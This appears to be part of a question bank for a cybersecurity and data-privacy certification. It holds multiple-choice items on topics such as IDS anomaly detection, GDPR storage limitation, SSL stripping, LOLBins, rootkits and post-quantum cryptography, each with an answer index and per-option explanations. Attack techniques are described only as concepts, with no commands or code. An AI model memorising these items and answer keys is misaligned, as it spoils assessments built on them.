  {id:513,domain:A,question:"What is an intrusion detection system (IDS) anomaly detection mode?",options:["Matching observed network traffic patterns and system activity against a database of pre-defined attack signatures and indicators of compromise for known malware and exploits","Establishing a baseline of normal behavior and alerting on statistical deviations, enabling detection of novel attacks without known signatures","Identifying unusual physical behavior in computer hardware components such as unexpected temperature spikes, power consumption anomalies, or firmware integrity failures on endpoints","Permitting only network traffic matching a pre-defined allowlist of approved source addresses, destination ports, and protocols while blocking all non-conforming traffic"],answer:1,explanation:"Anomaly-based detection catches zero-days and insider threats that have no signatures — at the cost of higher false positive rates when legitimate behavior deviates from the baseline.",optionExplanations:["Signature-based detection matches known attack patterns; anomaly detection baselines normal behavior and alerts on statistical deviations, enabling detection of novel attacks without existing signatures.","Anomaly-based IDS learns what normal looks like (traffic volume, protocol distribution, user behavior) and alerts when observed behavior deviates significantly from that baseline.","Hardware anomaly monitoring is a physical and firmware security domain; IDS anomaly detection specifically analyzes network traffic or system software behavior for statistical deviations from baseline.","Allowlist-based traffic control is network access control; anomaly detection measures statistical deviation from an established behavioral baseline, not binary matching against a known-good allowlist."]},
  {id:514,domain:P,question:"What is the storage limitation principle in data privacy?",options:["Setting a maximum data volume or storage quota that restricts the total quantity of information that can be retained about any single identified individual data subject","Personal data should be kept in identifiable form only as long as necessary for the purpose it was collected — then deleted or anonymized","Requiring that all personal data be maintained within a single designated central database or repository rather than distributed across multiple systems, locations, or cloud environments","Mandating that all personal data must be stored and processed exclusively on internal on-premises infrastructure, prohibiting use of any external cloud storage or processing services"],answer:1,explanation:"GDPR Article 5(1)(e) mandates storage limitation — customer purchase data needed for 7-year tax compliance must be deleted at 7 years, not kept indefinitely.",optionExplanations:["Data volume quotas per person are storage capacity constraints; storage limitation addresses how long personal data may be retained in identifiable form, not how much can be stored.","Storage limitation means defining and enforcing retention periods for each data category — keeping data longer than necessary creates legal liability and increases breach exposure.","Centralizing data to a single location is data architecture governance; storage limitation concerns the duration of retention in identifiable form, not the number of storage systems used.","Restricting processing to on-premises infrastructure is a data residency requirement; storage limitation addresses the duration personal data may be kept in identifiable form regardless of storage location."]},
  {id:515,domain:G,question:"What is a digital signature?",options:["A legally recognized electronic signature method that may consist of a typed name, a checkbox click, or a click-to-sign button indicating intent to be bound by a document","A cryptographic mechanism using the signer's private key to create a verification code attached to a message, allowing recipients to verify both the sender's identity and message integrity","A digitized bitmap image created by scanning or photographically capturing a person's physical handwritten ink signature for insertion into electronic documents or PDF forms","A numeric personal identification code entered by an authorized user to approve document workflows and advance signature requests within electronic contract management platforms"],answer:1,explanation:"Digital signatures (RSA, ECDSA) provide authentication (who signed it), integrity (the content wasn't changed), and non-repudiation (the signer cannot deny signing).",optionExplanations:["Electronic signatures are a broad legal concept encompassing typed names and clicks; digital signatures are specifically cryptographic mechanisms providing mathematical proof of identity and message integrity.","A digital signature hashes the message content, then encrypts the hash with the signer's private key — recipients decrypt with the public key and verify the hash matches the message.","Scanned handwritten signature images are bitmap graphics with no cryptographic properties or tamper evidence; digital signatures use asymmetric cryptography to provide mathematically verifiable authenticity.","PINs are authentication factors for access control and workflow approval; digital signatures use private keys to generate cryptographic proofs of identity and message content integrity."]},
  {id:516,domain:T,question:"What is a smishing attack?",options:["A threat actor social engineering technique combining in-person approaches near outdoor smoking areas with follow-up phishing emails targeting the same contacted individuals","Phishing conducted via SMS/text messages, attempting to lure victims into clicking malicious links or calling fraudulent phone numbers","A phishing variant that embeds emoji characters, smiley faces, and informal friendly language in messages to appear non-threatening and reduce victim suspicion of malicious intent","A low-frequency, extended-duration phishing campaign that sends a small number of targeted messages across weeks or months to avoid triggering spam filters and user suspicion"],answer:1,explanation:"Smishing exploits SMS's perceived trustworthiness — people are more likely to click text message links than email links, and mobile users often can't inspect URLs before clicking.",optionExplanations:["Smoking area social engineering is a pretexting technique; smishing is specifically the use of SMS text messages as the delivery channel for phishing attacks against mobile users.","Smishing sends text messages claiming to be banks, delivery services, or government agencies with urgent links — 'Your package is held, verify here' or 'Your account is suspended'.","Emoji and friendly tone are stylistic techniques some phishing uses; smishing is defined specifically by SMS delivery channel, not by the visual tone or formatting of the message.","Slow, persistent phishing campaigns describe a timing-based evasion strategy; smishing is specifically defined by the use of SMS text messages as the communication channel."]},
  {id:517,domain:A,question:"What is a cloud workload protection platform (CWPP)?",options:["A cloud financial operations platform that tracks, forecasts, and optimizes cloud infrastructure spending across multiple providers using budget alerts, tagging, and cost allocation","A security solution providing visibility and protection for workloads across public clouds, private clouds, and on-premises environments, including VMs, containers, and serverless","A cloud-native observability platform that collects and visualizes performance metrics, application logs, and distributed traces from cloud applications and microservices infrastructure","An infrastructure-as-code orchestration platform such as Terraform or Pulumi that enables consistent automated provisioning and deployment of workloads across multiple cloud providers"],answer:1,explanation:"CWPPs (Prisma Cloud, Defender for Cloud) apply runtime protection, vulnerability management, and behavioral monitoring to cloud workloads regardless of where they run.",optionExplanations:["Cloud cost management is FinOps; CWPPs focus on security protection of workloads including vulnerability scanning, runtime threat detection, and security policy enforcement for cloud-deployed assets.","A CWPP provides unified security across hybrid and multi-cloud environments — scanning workload images for vulnerabilities, detecting runtime threats, and enforcing security policies for VMs, containers, and functions.","Observability platforms collect operational performance data; CWPPs specifically provide security protection including active threat detection, vulnerability scanning, and policy enforcement for workloads.","Multi-cloud deployment orchestration platforms manage infrastructure provisioning; CWPPs provide security for already-deployed workloads, not the deployment mechanism itself."]},
  {id:518,domain:O,question:"What is the difference between a full backup and an incremental backup?",options:["Full backup jobs apply AES-256 encryption to all archived data at rest, while incremental backup jobs transmit data in plaintext to reduce processing overhead and speed","A full backup copies all data; an incremental backup copies only data changed since the last backup — balancing storage efficiency with recovery complexity","Incremental backups provide stronger security protection than full backups because their smaller size makes encryption, offsite transfer, and secure long-term storage more manageable","Full backup jobs are scheduled to run on a weekly basis while incremental backup jobs are executed monthly to spread storage costs and reduce backup window duration"],answer:1,explanation:"Full: simple recovery (restore one backup) but slow and storage-intensive. Incremental: fast and efficient but complex recovery (restore full + all incrementals in order).",optionExplanations:["Backup types differ in what data they capture, not in whether encryption is applied; both full and incremental backups should be encrypted regardless of the backup type.","Full backups copy everything (baseline), while incremental backups copy only changes since the last backup — reducing backup time and storage but requiring sequential restoration.","Both backup types require equivalent security controls regardless of size; incremental backups do not inherently offer greater security than full backups, only storage and time efficiency.","Backup scheduling frequency is an organizational policy decision; the distinction between full and incremental backups is what data they capture — all data versus changes since the last backup."]},
  {id:519,domain:T,question:"What is a man-in-the-middle attack using SSL stripping?",options:["Revoking or removing SSL/TLS certificates from web servers to force those servers to fall back to serving all web content over unencrypted HTTP connections","Downgrading an HTTPS connection to HTTP by intercepting the initial connection before the browser receives the HTTPS redirect, allowing plaintext interception","Uninstalling or disabling TLS client libraries and certificate trust stores from a victim's device to prevent the device from establishing any encrypted HTTPS connections","Decrypting and permanently removing encryption from files stored on a target device or server, converting protected ciphertext back into recoverable accessible plaintext format"],answer:1,explanation:"SSL stripping intercepts the user's initial HTTP request before the server can redirect to HTTPS, serving HTTP while maintaining HTTPS with the server — the user is unaware they're unprotected.",optionExplanations:["Revoking server certificates is certificate lifecycle management or an attack on server configuration; SSL stripping is a client-side network interception attack manipulating connection establishment.","SSL stripping works at the connection initiation phase — the attacker intercepts HTTP traffic and maintains HTTP with the client while upgrading to HTTPS with the server, seeing all plaintext.","Removing TLS capabilities from a device is an endpoint attack requiring access; SSL stripping is a network-level attack intercepting connections in transit without requiring access to the device.","File decryption is a storage-layer operation distinct from transport security; SSL stripping specifically targets the connection negotiation between browser and server to downgrade HTTPS to HTTP."]},
  {id:520,domain:G,question:"What is the OWASP Top 10?",options:["An annual analyst report published by firms such as Gartner or Forrester ranking the top ten cybersecurity product vendors by market revenue, capability ratings, and customer satisfaction","A regularly updated list of the most critical web application security risks, serving as a standard awareness document for developers and security teams","A law enforcement or cybersecurity organization-published list ranking the most dangerous active threat actor groups and individual hackers by assessed capability and attack impact","A compliance framework published by a regulatory authority that specifies ten mandatory technical security controls all organizations in a regulated sector must implement and audit annually"],answer:1,explanation:"OWASP Top 10 (injection, broken auth, sensitive data exposure, XSS, etc.) is the most referenced web security standard — many compliance frameworks require addressing it.",optionExplanations:["Security vendor rankings are commercial analyst reports; the OWASP Top 10 is a technical awareness document identifying the most prevalent and impactful web application vulnerability categories.","The OWASP (Open Web Application Security Project) Top 10 identifies and describes the most prevalent and impactful web application security risks — with descriptions, examples, and prevention guidance.","Threat actor rankings do not exist as a recognized security standard; the OWASP Top 10 identifies web application vulnerability risk categories, not threat actors or individuals.","The OWASP Top 10 is guidance and awareness material, not a regulatory mandate; while referenced in compliance, it is a risk awareness framework, not a required control standard."]},
  {id:521,domain:O,question:"What is a red team engagement?",options:["A competitive team exercise format where multiple groups compete against each other to complete security capture-the-flag challenges using equipment and systems designated in red","An authorized, adversarial simulation where a team acts as a realistic threat actor to test the organization's defenses, detection, and response capabilities holistically","A monthly organization-wide security drill placing all systems under elevated alert status to practice emergency notification escalation procedures and test incident communication channels","A dedicated team of security analysts and forensic investigators whose primary function is detecting, analyzing, containing, and remediating active cybersecurity incidents in real time"],answer:1,explanation:"Red teams go beyond point-in-time penetration tests — they simulate entire attack campaigns (initial access, lateral movement, data exfiltration) over weeks or months.",optionExplanations:["CTF competitions use 'red' descriptively; red team engagements are authorized adversarial simulations against a specific organization's real defenses, detection capabilities, and response teams.","A red team engagement simulates a real adversary using the same TTPs, testing not just technical controls but detection capability, response time, and response effectiveness.","Red alert security drills test notification procedures; red team engagements simulate realistic adversaries using actual attack techniques to test detection, response effectiveness, and security controls holistically.","Incident detection and response teams are the blue team; red teams conduct authorized offensive simulations acting as realistic adversaries to test the effectiveness of defensive capabilities."]},
  {id:522,domain:T,question:"What is a keylogger?",options:["A dedicated hardware security module or software-based credential vault that generates, stores, rotates, and controls access to cryptographic encryption keys and digital certificates","Software or hardware that records keystrokes to capture passwords, credit card numbers, and other sensitive data typed by the user","An audit logging system that records all physical access key issuances, returns, and badge swipe events for facility entry management and physical security accountability","A software application or browser extension that automatically generates, stores, and fills in strong random passwords for websites and online accounts on behalf of the user"],answer:1,explanation:"Hardware keyloggers plug between keyboard and PC; software keyloggers run as processes — both capture everything typed including passwords and sensitive data.",optionExplanations:["Key management devices like HSMs store and manage cryptographic keys; keyloggers capture keyboard input to steal user-typed credentials, passwords, and sensitive data for attacker use.","Keyloggers intercept keyboard input at the hardware or OS level, recording all keystrokes and often sending them to remote attackers — capturing credentials, PINs, and sensitive communications.","Physical key issuance logs are facility security records; keyloggers are malicious tools that record keyboard input at the OS or hardware level to capture user-typed credentials.","Password managers generate and store credentials for convenience; keyloggers are surveillance tools that secretly record all keystrokes to capture passwords that users type into systems."]},
  {id:523,domain:A,question:"What is cloud-native security?",options:["Security services, built-in controls, and native features included within cloud service providers' platforms such as IAM, default encryption at rest, and DDoS protection capabilities","Security approaches and tools designed specifically for cloud environments — using cloud APIs, automation, and ephemeral infrastructure rather than adapting traditional on-premises tools","Application security practices applied specifically to programs written in languages that are natively compiled and executed within cloud platform serverless or container runtime environments","Security controls and hardening practices applied to applications specifically developed using languages such as Go or Rust that are commonly adopted in cloud microservices development"],answer:1,explanation:"Cloud-native security uses IaC scanning, CSPM, CWPP, and cloud API integration — traditional perimeter tools can't inspect API calls and serverless function invocations.",optionExplanations:["CSP-provided native security is one component of a cloud security strategy; cloud-native security is a broader architectural approach purpose-built for cloud environments using automation and APIs.","Cloud-native security embraces immutable infrastructure, automated security testing in CI/CD, cloud-specific controls, and API-based integration with cloud services — going beyond lifting-and-shifting traditional tools.","Language-specific application security is a subset of secure coding; cloud-native security addresses the full security architecture and tooling approach for cloud environments at infrastructure scale.","Programming language security practices are a development concern; cloud-native security encompasses the entire security architecture, automation, and tooling strategy optimized for cloud-scale environments."]},
  {id:524,domain:P,question:"What is the accountability principle in data privacy?",options:["Holding individual employees, contractors, or administrators personally liable and subject to disciplinary action for data breaches caused by their negligent or intentional actions","The obligation of data controllers to be responsible for and demonstrate compliance with data protection principles","The financial penalties, administrative fines, and regulatory sanctions that supervisory authorities impose on organizations for violations of data protection regulations such as GDPR","The contractual and regulatory obligation of data processors to follow controller instructions, implement appropriate security safeguards, and notify controllers of incidents within required timeframes"],answer:1,explanation:"GDPR accountability (Article 5(2)) requires controllers to not only comply but to demonstrate compliance — through DPIAs, records of processing, policies, and DPO appointment.",optionExplanations:["Individual liability for breaches may be part of enforcement; the accountability principle places responsibility on the data controller organization to demonstrate compliance with all data protection principles.","Accountability requires organizations to document their data processing activities, implement appropriate safeguards, and be able to demonstrate to regulators that they comply with data protection law.","Financial penalties are one enforcement mechanism for non-compliance; the accountability principle is about organizational responsibility for implementing safeguards and being able to demonstrate compliance.","Processor obligations to controllers are governed by Article 28 processor agreements; the accountability principle broadly places responsibility on controllers for the entire data processing operation."]},
  {id:525,domain:G,question:"What is entropy in cryptography?",options:["The degree of structural disorganization or bit-pattern unpredictability within cryptographic key material, measured in bits as an indicator of overall key randomness and strength","The measure of unpredictability or randomness in a system — high entropy sources are essential for generating strong cryptographic keys and nonces","The amount of electrical power consumed by hardware and software components when executing cryptographic algorithms such as AES, RSA, or elliptic curve operations under load","The computational difficulty and algorithmic work factor of an encryption scheme as measured by the number of mathematical operations required to complete encryption or decryption"],answer:1,explanation:"Low entropy (predictable seeds) leads to weak keys — the Debian OpenSSL bug (2008) that limited random number generation to 32,768 possible values made all generated keys predictable.",optionExplanations:["Key unpredictability is related to entropy but disorder alone is not the cryptographic definition; entropy quantifies how unpredictable a random source is, which determines key strength.","Cryptographic entropy quantifies how unpredictable a random number generator is — high entropy (true randomness) produces keys that cannot be predicted; low entropy makes keys predictable and attackable.","Energy consumption is a physical characteristic measured in watts; cryptographic entropy is a mathematical measure of randomness quality in bits, not an energy or power measurement.","Algorithmic complexity measures computational effort; entropy measures the quality and unpredictability of randomness used to generate keys, not the difficulty of the encryption algorithm itself."]},
  {id:526,domain:O,question:"What is security hardening?",options:["Manufacturing physical security hardware components such as server enclosures, cable locks, and access barriers from more durable materials to resist physical tampering and destruction","The process of securing a system by reducing its attack surface — disabling unnecessary services, closing unused ports, removing default accounts, and applying secure configurations","Upgrading all systems to implement stronger encryption algorithms by replacing deprecated ciphers with AES-256 for data at rest and TLS 1.3 for all data in transit","Tightening existing firewall rule sets by removing overly permissive allow rules and implementing more restrictive policies to block additional categories of unauthorized network traffic"],answer:1,explanation:"Hardening follows CIS Benchmarks or DISA STIGs — disabling Telnet, removing default passwords, patching, disabling USB ports, and configuring required services securely.",optionExplanations:["Hardening physical security hardware is physical security equipment engineering; security hardening addresses software attack surface reduction through configuration changes, not physical material durability.","Security hardening systematically removes unnecessary functionality and applies security configurations — each unnecessary service or open port is a potential attack vector eliminated through hardening.","Encryption strengthening is one security hardening activity among many; hardening comprehensively reduces the attack surface including unnecessary services, open ports, default credentials, and insecure configurations.","Firewall rule tightening is perimeter security hardening; system hardening addresses the systems themselves by removing unnecessary services, closing ports, and applying secure baseline configurations."]},
  {id:527,domain:T,question:"What is living-off-the-land (LotL) binaries (LOLBins)?",options:["The physical and strategic planning practice of siting server farms and data center campus facilities on agricultural or undeveloped rural land to reduce real estate costs","Legitimate system executables (certutil, mshta, regsvr32, rundll32) abused by attackers to download payloads, execute code, or bypass application controls","Compiled executable binary files that reside on and execute from servers located in terrestrial on-premises data centers rather than in public cloud or virtual infrastructure","Compiled executable programs deployed in smart farming equipment, precision agriculture sensor systems, and rural supply chain management platforms for agricultural operations"],answer:1,explanation:"LOLBins are trusted Windows/Linux binaries signed by Microsoft or the OS vendor — security tools often whitelist them, making them ideal for bypass.",optionExplanations:["Data center site selection on rural land is facility planning; LOLBins is a Windows and Linux security concept describing legitimate OS executables abused by attackers for malicious purposes.","LOLBins (Living Off The Land Binaries) include certutil.exe (downloads files), regsvr32 (executes DLLs), mshta (executes HTML applications) — all legitimate but frequently abused for malicious purposes.","On-premises server binaries are a deployment model description; LOLBins specifically refers to existing OS-native executables that attackers repurpose to execute malicious actions and evade detection.","Agricultural system executables are a completely different context; LOLBins is a cybersecurity term specifically describing OS-built-in executables repurposed by attackers to evade application controls."]},
  {id:528,domain:A,question:"What is application segmentation?",options:["Structuring application source code into independent functional modules or microservices to improve maintainability, reusability, and separation of software development responsibilities","Separating application tiers (web, application, database) into distinct network zones with access controls between them","Deploying application workloads across multiple geographic cloud regions to improve availability, reduce user latency, and satisfy data residency regulatory requirements for global operations","Organizing application end users into distinct groups based on job role or permission level, granting each group different feature visibility and data access permissions within the application"],answer:1,explanation:"Three-tier segmentation (DMZ for web → App tier behind firewall → DB tier on isolated network) ensures database servers are never directly reachable from the internet.",optionExplanations:["Code modularization is software architecture design; application segmentation is network security architecture that isolates application tiers into distinct network zones with access controls between them.","Application segmentation separates the presentation, logic, and data tiers into distinct security zones — even if the web tier is compromised, attackers can't directly access the database tier.","Geographic workload distribution is cloud availability architecture; application segmentation is network-level security isolation between application tiers to limit lateral movement after a compromise.","User group access control is RBAC applied within applications; application segmentation is network-level isolation of presentation, logic, and data tiers into separate security zones."]},
  {id:529,domain:P,question:"What is the right to access under GDPR?",options:["The right for any member of the public to freely access and inspect all data, records, and information held by any commercial, governmental, or nonprofit organization","An individual's right to request confirmation of whether their personal data is processed, and to receive a copy of that data and information about how it is used","The right of a data subject to submit a correction request requiring a data controller to update or amend inaccurate, incomplete, or outdated personal data held about them","The right of a data subject to request that an organization temporarily pause all non-essential processing of their personal data while accuracy or lawfulness is disputed"],answer:1,explanation:"GDPR Article 15 (Subject Access Request) gives individuals the right to know what data organizations hold about them — organizations must respond within one month.",optionExplanations:["Unrestricted access to any organization's data would constitute unauthorized access; the right of access applies only to an individual's own personal data held by an organization.","The right of access enables individuals to submit Subject Access Requests (SARs), receive confirmation of processing, a copy of their data, and information about purposes, retention, and sharing.","The right to have inaccurate data corrected is the right to rectification under GDPR Article 16; the right of access is specifically about receiving a copy of one's own data.","Pausing processing while accuracy is disputed is the right to restriction of processing under GDPR Article 18; the right of access is about viewing and obtaining copies of personal data."]},
  {id:530,domain:G,question:"What is a HMAC (Hash-Based Message Authentication Code)?",options:["A computationally intensive password-specific hashing algorithm such as bcrypt, scrypt, or Argon2 designed to resist brute-force and GPU-accelerated password cracking attacks","A MAC that uses a cryptographic hash function combined with a secret key to verify both data integrity and message authenticity","A network access control device or policy engine that manages and enforces MAC address filtering policies on network switches and wireless access points to control device connectivity","A public key infrastructure mechanism using X.509 digital certificates and asymmetric encryption to authenticate the identity of message senders in secure email or API systems"],answer:1,explanation:"HMACs (HMAC-SHA256) add a secret key to hashing — without the key, an attacker cannot create a valid HMAC even if they know the hash algorithm.",optionExplanations:["Password hashing algorithms like bcrypt protect stored passwords; HMAC is a message authentication code that combines a hash function with a shared secret key to verify message authenticity.","HMAC combines a hash function (SHA-256, SHA-3) with a shared secret key to produce an authentication code — verifying the message came from someone with the key and was not tampered with.","MAC address filtering is a network access control mechanism; HMAC is a cryptographic algorithm using a hash function combined with a secret key to produce message authentication codes.","Certificate-based authentication uses asymmetric PKI; HMAC uses a shared symmetric secret key combined with a hash function, not certificates, to verify message authenticity and integrity."]},
  {id:531,domain:T,question:"What is a cryptojacking attack?",options:["Gaining unauthorized access to cryptocurrency trading platforms and exchanges by exploiting web application vulnerabilities or API weaknesses to manipulate trades or steal funds","Unauthorized use of a victim's computing resources to mine cryptocurrency by deploying mining software through malware or malicious scripts","Stealing private keys, seed phrases, or wallet files from digital currency wallet software or hardware devices to transfer victims' cryptocurrency to attacker-controlled wallet addresses","Exploiting coding errors or logic flaws in blockchain smart contracts deployed on networks like Ethereum to drain funds from decentralized finance protocol liquidity pools"],answer:1,explanation:"Cryptojacking degrades victim system performance while generating cryptocurrency profit for attackers — delivered via malicious websites (browser mining) or malware.",optionExplanations:["Cryptocurrency exchange attacks target financial platforms; cryptojacking specifically hijacks victims' CPU and GPU resources to mine new cryptocurrency for attackers without the victim's knowledge.","Cryptojacking secretly installs mining software or runs JavaScript miners in browsers, consuming CPU/GPU resources to mine cryptocurrency for attackers while victims experience degraded performance.","Cryptocurrency wallet theft steals existing holdings from victims; cryptojacking mines new cryptocurrency using victims' computational resources rather than stealing directly from their wallets.","Smart contract exploitation is blockchain application security; cryptojacking hijacks computing resources for cryptocurrency mining operations rather than exploiting blockchain contract vulnerabilities."]},
  {id:532,domain:A,question:"What is a next-generation firewall (NGFW)?",options:["A firewall appliance built on specialized high-performance dedicated hardware with custom ASICs and multi-core processors optimized for high-throughput stateful packet processing","A firewall that combines traditional packet filtering with deep packet inspection, application awareness, user identity tracking, and intrusion prevention capabilities","A virtualized or containerized firewall solution architecturally designed and optimized specifically for deployment in public cloud environments using cloud-native APIs and auto-scaling","A firewall product that applies machine learning models and behavioral analytics to evaluate each connection attempt and make autonomous real-time allow or block decisions"],answer:1,explanation:"NGFWs (Palo Alto, Fortinet) identify applications regardless of port — 'allow Facebook but block Facebook Games' — and correlate traffic with user identities from directory services.",optionExplanations:["Hardware specifications do not define NGFW classification; NGFW capabilities are defined by deep packet inspection depth, application identification, user identity awareness, and integrated IPS functionality.","NGFWs go beyond IP/port filtering — they inspect application layer protocols, identify applications, enforce user-based policies, decrypt and inspect SSL traffic, and include integrated IPS.","Cloud-native firewalls are a deployment model and form factor; NGFW refers to inspection depth and application-layer capabilities regardless of whether deployment is on-premises or cloud-based.","AI-based decision making may be a feature in some advanced products; NGFW is defined by application-layer deep packet inspection, user identity tracking, and integrated intrusion prevention."]},
  {id:533,domain:O,question:"What is continuous integration/continuous deployment (CI/CD) security?",options:["Ensuring that software development and deployment activities occur on a rapid, frequent, and uninterrupted schedule with no gaps or delays in the automation and release workflow","Securing the automated software build and deployment pipeline from code commit through production deployment to prevent supply chain attacks and code tampering","Embedding security professionals directly into agile development sprint teams so security reviews, threat modeling, and code analysis occur continuously throughout the development lifecycle","An automated process for continuously packaging, testing, and deploying security patches and vulnerability fixes to all managed organizational systems as soon as they become available"],answer:1,explanation:"CI/CD pipeline attacks (like SolarWinds) compromise build systems to inject malicious code — security includes signed commits, SAST scanning, secret detection, and artifact signing.",optionExplanations:["Development and deployment continuity is a DevOps productivity goal; CI/CD security specifically addresses protecting the pipeline itself from supply chain attacks and malicious code injection.","Securing CI/CD pipelines involves protecting build servers, signing code commits, running SAST/SCA in pipelines, scanning container images, and signing deployment artifacts.","Integrating security into development teams is DevSecOps culture; CI/CD pipeline security is the technical discipline of protecting automated build, test, and deployment infrastructure from compromise.","Automated patch deployment is one CI/CD pipeline use case; CI/CD security addresses protecting the entire pipeline from source code through production deployment against supply chain attacks."]},
  {id:534,domain:T,question:"What is a rootkit's primary defense evasion technique?",options:["Applying encryption and code obfuscation techniques to the malware binary payload to prevent antivirus signature databases from matching it against known malware samples","Subverting operating system functions to conceal its own presence and the presence of other malware from security tools and administrators","Using stolen or fraudulently obtained code signing certificates to digitally sign malicious executables so they appear as trusted legitimate software to endpoint security controls","Renaming malicious process executables and service names to match exactly those of legitimate Windows or Linux system processes to blend into normal process listings"],answer:1,explanation:"Kernel-level rootkits (ring 0) hook system calls, modifying what the OS reports to security tools — making files, processes, and network connections invisible.",optionExplanations:["Code encryption for signature evasion is used by many malware types; rootkit evasion specifically subverts OS-level visibility so the rootkit and other malware are hidden from security tools.","Rootkits intercept OS API calls (e.g., listing files, listing processes) and filter out their own entries — security tools see a 'clean' system because the rootkit controls what the OS reports.","Code signing certificate abuse is a separate evasion technique; rootkits specifically modify operating system functions to hide their own presence from processes listing files or running programs.","Process name masquerading is a visibility evasion technique; rootkits go deeper by intercepting OS API calls to filter out their own entries from what the operating system reports."]},
  {id:535,domain:G,question:"What is end-to-end encryption (E2EE)?",options:["Encrypting all network traffic between a client device and a destination server using TLS to protect data from eavesdropping by third parties on the network path","Encryption where only the communicating endpoints can decrypt messages — the service provider handling the transmission cannot decrypt the content","A comprehensive data protection strategy that applies encryption both to data stored on disk, in databases, and in backups and to data transmitted over all network connections","An encryption method that protects all data stored on an entire storage device by encrypting every sector, including the operating system, using a pre-boot authentication key"],answer:1,explanation:"E2EE (Signal, WhatsApp, ProtonMail) means the service provider cannot read your messages even if legally compelled — keys exist only on endpoint devices.",optionExplanations:["TLS transport encryption protects data in transit but allows the server to decrypt and read the content; E2EE prevents even the service provider's servers from decrypting messages.","E2EE means encryption keys only exist on the sender and receiver — intermediary servers transmit ciphertext they cannot decrypt, providing privacy even if the service provider is compromised or compelled.","Encrypting both storage and transit is a general data protection approach; E2EE specifically ensures no intermediary between communicating endpoints can decrypt the content during transmission.","Full disk encryption protects data at rest on a storage device; E2EE protects data in transit between communicating endpoints so no intermediate server or provider can access plaintext."]},
  {id:536,domain:P,question:"What is a data breach notification requirement?",options:["Proactively informing existing customers about newly developed data products, services, or features through planned marketing and communications channels","Legal obligation to inform affected individuals and regulatory authorities when personal data has been compromised through unauthorized access, within specific timeframes","An internal IT incident report documenting technical details of a security event for the organization's own records and remediation tracking","A mandatory news media announcement that organizations must issue to inform the general public whenever a significant data breach has occurred"],answer:1,explanation:"GDPR requires notification to supervisory authority within 72 hours and to affected individuals 'without undue delay' — many US states have similar laws with varying timeframes.",optionExplanations:["Customer notifications about new products are marketing activities; breach notifications are legally mandated obligations triggered by unauthorized access events, not product launches.","Breach notification laws require organizations to inform individuals whose data was exposed (so they can protect themselves) and regulators (for oversight) within defined timeframes.","Internal incident reports document events for internal use and remediation; breach notification requirements mandate external communications to individuals and regulators within defined legal timeframes.","Media notifications may occur voluntarily or be required for very large breaches; legal notification requirements specifically mandate informing affected individuals and regulators, not necessarily the general media."]},
  {id:537,domain:A,question:"What is a secure enclave?",options:["A physically secured data center room with biometric access controls, reinforced walls, CCTV monitoring, and environmental sensors to protect server infrastructure","A hardware-isolated execution environment within a processor that provides confidential computing, protecting code and data from the host OS and other applications","A logically separated network segment with strict firewall rules and access controls that isolates sensitive systems from the general corporate network","A tamper-resistant hardware security module (HSM) container that stores cryptographic keys, performs key operations, and provides a secure boundary for key material"],answer:1,explanation:"Intel SGX, AMD SEV, and ARM TrustZone create isolated memory regions — even the hypervisor or OS cannot inspect enclave memory, enabling confidential cloud computing.",optionExplanations:["Physically secured data center rooms are facility security controls; secure enclaves are hardware isolation features built into processors, not physical rooms.","Secure enclaves (Intel SGX, Apple Secure Enclave) create protected memory regions where code and data are encrypted and isolated from the rest of the system — including privileged software.","Protected network segments are network segmentation security controls; secure enclaves are processor-level hardware isolation features, not network architecture components.","HSMs are dedicated cryptographic hardware with secure key storage; secure enclaves are processor features creating protected memory regions for general confidential computation."]},
  {id:538,domain:O,question:"What is the purpose of a configuration management database (CMDB)?",options:["Storing and versioning database server configuration files such as settings, connection strings, and parameters in a shared repository for administrator access","A repository that maintains records of all IT assets (configuration items) and their relationships, supporting change management and incident response","A centralized database that stores security tool configurations, firewall rule sets, and endpoint policy settings for consistent enforcement across systems","A management console designed exclusively for database administrators to monitor query performance, manage schema changes, and configure database security settings"],answer:1,explanation:"CMDBs enable impact analysis (what does changing this server affect?), support incident investigation (what changed recently?), and maintain the asset inventory security teams need.",optionExplanations:["Database configuration file storage is a DevOps or infrastructure task; CMDBs track all IT assets and their interdependencies across the entire organization.","A CMDB is the authoritative record of IT assets (servers, applications, network devices) and how they relate — enabling change impact analysis, incident troubleshooting, and security inventory.","Security configuration databases store policy settings; CMDBs maintain records of all IT assets and their relationships to support change management and incident response.","DBA management tools handle database-specific tasks; CMDBs serve all IT operations teams and track the entire IT asset landscape, not just database systems."]},
  {id:539,domain:T,question:"What is a multi-vector attack?",options:["An attack that routes malicious traffic through multiple IP addresses or proxy servers to evade IP-based blocking and make attribution more difficult","An attack combining multiple attack techniques and channels simultaneously to overwhelm defenses, increase chances of success, and complicate detection and response","A widespread attack campaign that simultaneously targets many different organizations or individuals, maximizing the attacker's reach and overall financial or strategic impact","A worm or virus that propagates laterally across multiple network segments by exploiting routing trust relationships between otherwise segmented organizational networks"],answer:1,explanation:"Modern attacks rarely use a single technique — phishing delivers ransomware that exploits a vulnerability during installation while C2 uses legitimate cloud services to evade detection.",optionExplanations:["Multiple IP address usage is an evasion technique; multi-vector attacks combine multiple distinct attack techniques and delivery channels, not just varying source addresses.","Multi-vector attacks use phishing, exploit kits, USB drops, and living-off-the-land simultaneously — making it harder to block all entry points and creating response complexity.","Broad victim targeting is campaign scope; multi-vector attacks combine different techniques against potentially the same target, not simply the number of victims targeted.","Spreading across network segments is worm or lateral movement behavior; multi-vector attacks use multiple different techniques and channels rather than a single spreading mechanism."]},
  {id:540,domain:G,question:"What is post-quantum cryptography (PQC)?",options:["Cryptographic systems organizations plan to deploy once practical quantum computers become widely available and current encryption methods are deprecated by standards bodies","Classical mathematical algorithms designed to be resistant to attacks by quantum computers, addressing the threat that quantum computing poses to current encryption","Cryptography that leverages quantum mechanical phenomena such as superposition and entanglement to perform encryption computations on today's classical hardware systems","Next-generation communications systems that use quantum key distribution channels and quantum entanglement to transmit encrypted messages with unconditional security guarantees"],answer:1,explanation:"NIST PQC standards (CRYSTALS-Kyber, CRYSTALS-Dilithium, SPHINCS+) selected in 2024 replace RSA/ECC which quantum computers can break using Shor's algorithm.",optionExplanations:["PQC is deployed now to protect data collected today from future quantum decryption; it is not a future deployment plan but a present-day cryptographic practice.","PQC algorithms use mathematical problems (lattice-based, hash-based, code-based) that are hard for both classical and quantum computers — replacing vulnerable RSA and ECC.","PQC runs on classical computers using mathematical problems resistant to quantum attacks, not quantum physics; quantum mechanical cryptography describes QKD, not PQC algorithms.","Quantum key distribution (QKD) uses quantum physics for secure communications; PQC is classical mathematical algorithms designed to resist quantum computer attacks, not quantum-based communications."]},
